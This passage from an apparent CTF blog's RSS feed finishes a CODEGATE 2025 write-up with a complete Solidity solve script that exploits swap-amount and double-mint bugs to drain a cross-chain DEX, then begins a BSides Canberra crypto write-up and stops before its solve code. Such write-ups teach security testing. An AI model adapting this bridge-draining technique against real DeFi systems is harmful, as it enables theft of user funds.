&lt;p&gt;However, we can&amp;rsquo;t repeat this process for larger amounts without crashing the relayer - the swap will burn the same amount of tokens we are minted on the opposite chain - if that chain doesn&amp;rsquo;t have sufficient liquidity, the burn call reverts and &lt;strong&gt;relayers for both chains crash&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Relayers crashing was especially annoying when I first tried this exploit, I could for example mint 1,000,000 MOODENG on CODE chain, but this would crash the relayers, and since there is insufficient USDC and PURR on the CODE chain DEX, I couldn&amp;rsquo;t solve the challenge this way - we have to use some method of moving and gaining tokens on one chain without crashing the relayer in the process.&lt;/p&gt;
&lt;h4 id=&#34;solving-the-challenge&#34;&gt;Solving the challenge&lt;/h4&gt;
&lt;p&gt;Actually implementing the solve scripts for this challenge was a pain, since for whatever reason, &lt;a href=&#34;https://github.com/foundry-rs/foundry/issues/6825&#34;&gt;Foundry&amp;rsquo;s &lt;code&gt;--skip-simulation&lt;/code&gt; doesn&amp;rsquo;t work&lt;/a&gt;. Since there was cross chain components involved, this meant that we had to run several parts of the solve script manually. For example, if we bridged USDC from GATE to CODE chain, then tried to swap our USDC on CODE chain, Foundry&amp;rsquo;s simulation of the script wouldn&amp;rsquo;t pass since it doesn&amp;rsquo;t simulation the off-chain relayer and thinks we have no tokens on CODE chain, therefore we had to seperate these parts.&lt;/p&gt;
&lt;p&gt;Steps to solve the challenge:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;do the aforementioned swaps to move liquidity from GATE chain to CODE chain. We repeatedly swap USDC for PURR, then PURR to USDC, to move PURR tokens from the GATE chain to the CODE chain. Due to the amount recalculation bug, we can increase our swap amount by 19 USDC with each swap.&lt;/li&gt;
&lt;li&gt;once sufficient (&amp;gt;1200) PURR tokens are moved, we perform a similar process for the MOODENG tokens, but this time only 1 swap is required, as we already have enough USDC to buy 1200 MOODENG tokens. We thus receive 600 MOODENG from CODE DEX, and another 600 from GATE DEX&lt;/li&gt;
&lt;li&gt;finally, with all the liquidity moved to the CODE chain, we can use our double-minting bug to gain large amounts of USDC tokens, then use the USDC tokens to swap for PURR and MOODENG. The relayer crashes, but it doesn&amp;rsquo;t matter anymore at this point, since all the liquidity is moved to CODE chain and we don&amp;rsquo;t need to perform further cross-chain actions.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1337&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1337&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve_script.s.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from &amp;#34;forge-std/Script.sol&amp;#34;;
import {Counter} from &amp;#34;../src/Counter.sol&amp;#34;;
import &amp;#34;../src/Setup.sol&amp;#34;;
import &amp;#34;../src/FaucetLogic.sol&amp;#34;;
import &amp;#34;../src/Token.sol&amp;#34;;
import &amp;#34;../src/DEX.sol&amp;#34;;

contract Solve is Script {
    bytes32 USDC = keccak256(abi.encodePacked(&amp;#34;USDC&amp;#34;));
    bytes32 PURR = keccak256(abi.encodePacked(&amp;#34;PURR&amp;#34;));
    bytes32 MOO = keccak256(abi.encodePacked(&amp;#34;MOODENG&amp;#34;));
    Token tokenA_gate;
    Token tokenB_gate;
    Token tokenC_gate;
    Token tokenA_code;
    Token tokenB_code;
    Token tokenC_code;
    DEX dex_gate;
    DEX dex_code;
    uint privkey;
    address myAddr;
    FaucetLogic faucet;
    Setup setup;

    function setUp() public {
        privkey = vm.envUint(&amp;#34;PRIVKEY&amp;#34;);
        myAddr = vm.addr(privkey);
        
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_GATE&amp;#34;));

        setup = Setup(address(vm.envAddress(&amp;#34;SETUP&amp;#34;)));
        faucet = FaucetLogic(setup.faucet());
        
        tokenA_gate = Token(setup.tokenA());
        tokenB_gate = Token(setup.tokenB());
        tokenC_gate = Token(setup.tokenC());
        dex_gate = DEX(setup.dex());

        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));

        tokenA_code = Token(setup.tokenA());
        tokenB_code = Token(setup.tokenB());
        tokenC_code = Token(setup.tokenC());
        dex_code = DEX(setup.dex());
    }

    function run() public {
        // claim tokens and approve
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_GATE&amp;#34;));
        vm.startBroadcast(privkey);

        faucet.claimToken(address(tokenA_gate));
        faucet.claimToken(address(tokenB_gate));
        faucet.claimToken(address(tokenC_gate));

        tokenA_gate.approve(address(dex_gate), type(uint).max);
        tokenB_gate.approve(address(dex_gate), type(uint).max);
        tokenC_gate.approve(address(dex_gate), type(uint).max);

        // swap all tokens to USDC and bridge to CODE chain
        logBalances_gate();

        console.log(&amp;#34;swapping all for USDC and bridging&amp;#34;);
        dex_gate.swap(myAddr, PURR, USDC, 100 ether, false);
        dex_gate.swap(myAddr, MOO, USDC, 100 ether, false);
        dex_gate.swap(myAddr, USDC, USDC, 139 ether, true);

        logBalances_gate();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_0() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        // approve
        tokenA_code.approve(address(dex_code), type(uint).max);
        tokenB_code.approve(address(dex_code), type(uint).max);
        tokenC_code.approve(address(dex_code), type(uint).max);
        
        // swap USDC for PURR
        // and back
        // draining GATE DEX liquidity
        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 0;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_1() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        // swap USDC for PURR
        // and back
        // draining GATE DEX liquidity
        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 0;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_2() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 1;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_3() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 2;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_4() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 3;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_5() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 4;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_6() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 5;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_moo_0() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);
        
        logBalances_code();

        // move MOO liquidity from GATE to CODE chain
        dex_code.swap(myAddr, PURR, USDC, 1200 ether, false);
        dex_code.swap(myAddr, USDC, MOO, 229 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }
    
    function code_final_solve_0() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);
        
        logBalances_code();

        // get more USDC than DEX has
        dex_code.swap(myAddr, MOO, USDC, 1200 ether, false);

        // abuse double-mint to get large amount of USDC
        // on CODE chain.
        // this crashes relayer but doesnt matter anymore
        // since all required liquidity is moved to CODE chain
        for (int i=0; i&amp;lt;20; i&amp;#43;&amp;#43;) {
            dex_code.swap(myAddr, USDC, USDC, 350 ether, false);
        }

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_final_solve_1() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);
        
        logBalances_code();

        // swap USDC for required MOO and PURR
        // and solve challenge
        dex_code.swap(myAddr, USDC, PURR, 300 ether, false);
        dex_code.swap(myAddr, USDC, MOO, 300 ether, false);

        logBalances_code();

        setup.solve();

        vm.stopBroadcast();
    }

    function logBalances_gate() public {
        console.log(&amp;#34;\nmy&amp;#34;);
        console.log(&amp;#34;USDC my bal:&amp;#34;, tokenA_gate.balanceOf(address(myAddr)));
        console.log(&amp;#34;PURR my bal:&amp;#34;, tokenB_gate.balanceOf(address(myAddr)));
        console.log(&amp;#34;MOO my bal:&amp;#34;, tokenC_gate.balanceOf(address(myAddr)));
        console.log(&amp;#34;\ndex&amp;#34;);
        console.log(&amp;#34;USDC DEX bal:&amp;#34;, tokenA_gate.balanceOf(address(dex_gate)));
        console.log(&amp;#34;PURR DEX bal:&amp;#34;, tokenB_gate.balanceOf(address(dex_gate)));
        console.log(&amp;#34;MOO DEX bal:&amp;#34;, tokenC_gate.balanceOf(address(dex_gate)));
    }

    function logBalances_code() public {
        console.log(&amp;#34;\nmy&amp;#34;);
        console.log(&amp;#34;USDC my bal:&amp;#34;, tokenA_code.balanceOf(address(myAddr)));
        console.log(&amp;#34;PURR my bal:&amp;#34;, tokenB_code.balanceOf(address(myAddr)));
        console.log(&amp;#34;MOO my bal:&amp;#34;, tokenC_code.balanceOf(address(myAddr)));
        console.log(&amp;#34;\ndex&amp;#34;);
        console.log(&amp;#34;USDC DEX bal:&amp;#34;, tokenA_code.balanceOf(address(dex_code)));
        console.log(&amp;#34;PURR DEX bal:&amp;#34;, tokenB_code.balanceOf(address(dex_code)));
        console.log(&amp;#34;MOO DEX bal:&amp;#34;, tokenC_code.balanceOf(address(dex_code)));
    }
}


&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Running the solve script is split into several parts due to the cross chain component. Note that this is done after setting code for the faucet.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig run --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_0 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_1 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_2 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_3 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_4 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_5 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_6 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_moo_0 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_final_solve_0 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_final_solve_1 --broadcast
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;./img/solve.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 80%&#34;  /&gt;


&lt;p&gt;Get flag &lt;code&gt;codegate2025{f166ec27fa5efeac43470f8ab0f662effc56666a62d64998eafdca85a5fe3b54}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And blood the challenge!!&lt;/p&gt;

  &lt;img src=&#34;./img/blood.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;p&gt;Thanks to &lt;code&gt;snwo&lt;/code&gt; for authoring this challenge!&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;CODEGATE 2025 Finals CTF was a lot of fun - it was great meeting people from other teams! I also  participated in CODEGATE last year in the Junior division (and also came 7th lol), and it was a good experience, so I am glad I could attend once again!&lt;/p&gt;
&lt;p&gt;It was also my first time pulling an all nighter for the CTF - since it was 24 hours ranging from 10am to 10am the next day, a lot of teams also stayed the entire time.&lt;/p&gt;
&lt;p&gt;I would like to thank organisers and challenge authors for the CTF, and my team for their tremendous effort in the CTF, and I hope to attend again next year!&lt;/p&gt;
&lt;p&gt;As always, if you spotted any errors/typos in the blog, or have questions, feel free to DM/ping me on discord &lt;code&gt;thesavageteddy&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Btw, props to organisers for putting our team name emojis ü§¨üá´üá∑üõπüêª onto both the badge and banner lol.&lt;/p&gt;

  &lt;img src=&#34;./img/badge.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 30%&#34;  /&gt;


</content>
    </item>
    
    <item>
      <title>Crypto Writeups - BSides Canberra CTF 2024</title>
      <link>https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/</link>
      <pubDate>Sat, 28 Sep 2024 17:53:20 +1000</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/</guid>
      <description>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Last week I went to BSides Canberra 2024 to see the amazing talks, meet people, and of course, play CTF. After 2 days of solving interesting challenges, my team &lt;a href=&#34;https://x.com/EmuExploit&#34;&gt;Emu Exploit&lt;/a&gt; managed to get 2nd place overall!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;I was basically the only person in the team who was willing to do crypto :&amp;lt; so I decided to write up the crypto challenges I solved. Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#discrete-add-a-rithm---43-solves&#34;&gt;Discrete Add-a-rithm&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;43&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#psionic---10-solves&#34;&gt;Psionic&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#public-service---8-solves&#34;&gt;Public Service&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;8&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#arpeeceethree---3-solves&#34;&gt;arpeeceethree&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;3&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;discrete-add-a-rithm---43-solves&#34;&gt;Discrete Add-a-rithm - 43 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You enter a room. On the wall is a large tapestry showing two people exchanging gifts. What could it mean?&lt;/p&gt;</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Last week I went to BSides Canberra 2024 to see the amazing talks, meet people, and of course, play CTF. After 2 days of solving interesting challenges, my team &lt;a href=&#34;https://x.com/EmuExploit&#34;&gt;Emu Exploit&lt;/a&gt; managed to get 2nd place overall!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;I was basically the only person in the team who was willing to do crypto :&amp;lt; so I decided to write up the crypto challenges I solved. Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#discrete-add-a-rithm---43-solves&#34;&gt;Discrete Add-a-rithm&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;43&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#psionic---10-solves&#34;&gt;Psionic&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#public-service---8-solves&#34;&gt;Public Service&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;8&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/#arpeeceethree---3-solves&#34;&gt;arpeeceethree&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;3&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;discrete-add-a-rithm---43-solves&#34;&gt;Discrete Add-a-rithm - 43 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You enter a room. On the wall is a large tapestry showing two people exchanging gifts. What could it mean?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;We are provided with two files, &lt;code&gt;discreteAddarithm.py&lt;/code&gt; and &lt;code&gt;out.txt&lt;/code&gt;&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;discreteAddarithm.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/python3

from Crypto.Util.number import long_to_bytes, bytes_to_long
from Crypto.Util.number import getPrime, getRandomInteger, getRandomRange
from Crypto.Protocol.KDF import HKDF
import Crypto.Hash.SHA512 as sha512
import Crypto.Cipher.AES as aes
from Crypto.Util.Padding import pad, unpad
from binascii import * 
from cybearssecrets import flag

def generateParameters(bitlen=1024):
	p = getPrime(bitlen)
	gen = getRandomRange(2,p-1)
	return gen, p

def generateKeyPair(p, gen):
	privateKey = getRandomRange(2,p-1)
	publicKey = privateKey*gen % p
	return privateKey, publicKey

def generateSharedSecret(p, recipientPrivateKey, senderPublicKey):
	sharedSecret = recipientPrivateKey*senderPublicKey % p
	return sharedSecret

## Init
gen, p = generateParameters()
print(&amp;#34;gen = {}&amp;#34;.format(gen))
print(&amp;#34;p = {}&amp;#34;.format(p))

## A: Alice generates her pub/priv key pair
aPrivateKey, aPublicKey = generateKeyPair(p, gen)

## B: Bob generates his pub/priv key pair
bPrivateKey, bPublicKey = generateKeyPair(p, gen)

## A: Alice sends Bob her public key
print(&amp;#34;aPublicKey = {}&amp;#34;.format(aPublicKey))

## B: Bob sends Alice his public key
print(&amp;#34;bPublicKey = {}&amp;#34;.format(bPublicKey))

## A: Alice caluculates the shared secret
aSharedSecret = generateSharedSecret(p, aPrivateKey, bPublicKey)

## B: Bob caluculates the shared secret
bSharedSecret = generateSharedSecret(p, bPrivateKey, aPublicKey)

## Prove that they match
assert(aSharedSecret == bSharedSecret)

## A: Alice encrypts a message to Bob
aSessionKey, aIV = HKDF(long_to_bytes(aSharedSecret), 16, b&amp;#39;cybears2024&amp;#39;, sha512, num_keys=2)
a = aes.new(aSessionKey, aes.MODE_CBC, iv=aIV)
aCipher = a.encrypt(pad(flag,16))

print(&amp;#34;aCipher = {}&amp;#34;.format(hexlify(aCipher)))

## B: Bob decrypts the message
bSessionKey, bIV = HKDF(long_to_bytes(bSharedSecret), 16, b&amp;#39;cybears2024&amp;#39;, sha512, num_keys=2)
b = aes.new(bSessionKey, aes.MODE_CBC, iv=bIV)
bPlain = unpad(b.decrypt(aCipher), 16)

if (bPlain == flag):
	print(&amp;#34;Successful decryption!&amp;#34;) 
else:
	print(&amp;#34;Error - something went wrong&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;562389174&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;562389174&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;text&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;out.txt&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-text&#34; &gt;&lt;code&gt;
gen = 107665309954437515284050955368964848368303288172119448977068684165707548536106035934408882308704533335892101447750709116199826328820028967921540045634698373851938861013761725712688725891129665455073194344098566187055873775659411023106521425479072045658166413360399757570409372209072730576562842193768242314124
p = 154305601419430130125267211117098923915333624355567046250094074039674228187186943601303157833374662739969026864299363336407319080223107540886546467388611809417774875857578639486137855088896821184616399750557477866148643263803196632154429856293530179926011705130915364080130059881980341409627009701357523451267
aPublicKey = 80354936104370249925868492705190743680652231716704224547570074631753287352078443184923555333860525866848256788314156023903492043171511797029693297228294483818872563765707539175061570839714448005871291987391648926205060807957012526950116361633119573934316064444374124669861697695772912934202842834007697535925
bPublicKey = 42387482047117421466928118692687568439415997629141048723182072767997284324764640343272008345119819287526375581385721174494274510726524360731480638585425669685247170958054446797249761744238847427213615385731375648168698821769635116850680245545304663686514311913787022427877096835277158288159213482962236809739
aCipher = b&amp;#39;618fa12c3a6a6956a47a91bec13f9e1fe2d1031ba2f40a42b4f4d1d9757d0195ea6215fd694c2b99cf9a00be97b46791&amp;#39;
Successful decryption!
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;It is essentially &lt;a href=&#34;https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange&#34;&gt;Diffie Hellman key exchange&lt;/a&gt;, but with multiplication instead of exponentiation:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$p$ is a random 1024-bit prime&lt;/li&gt;
&lt;li&gt;$g$ (&lt;code&gt;gen&lt;/code&gt;) is a random integer from $2$ to $p-1$&lt;/li&gt;
&lt;li&gt;Alice generates her private key $a$ and computes her public key $A = a \times g \bmod{p}$&lt;/li&gt;
&lt;li&gt;Bob generates his public key $b$ and computers his public key $B = b \times g \bmod{p}$&lt;/li&gt;
&lt;li&gt;We are given $p$, $g$, $A$ and $B$&lt;/li&gt;
&lt;li&gt;The shared secret $s$ is calculated such that $s = A \times b = a \times g \times b = B \times a \bmod{p}$, and used as an AES key to encrypt the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Diffie Hellman leverages the discrete logarithm problem to make retrieving the private key from the public key difficult. However, in this challenge, multiplication is used instead of exponentiation to compute the public key, as $A = a \times g \bmod{p}$ instead of $A = a^g \bmod{p}$.&lt;/p&gt;
&lt;p&gt;Therefore, we can simply rearrange for the private key $a = A \times g^{-1} \bmod{p}$, then calculate the shared secret $s = a \times B \bmod{p}$, and decrypt the flag using the shared secret as the AES key.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;code.py&lt;/span&gt;
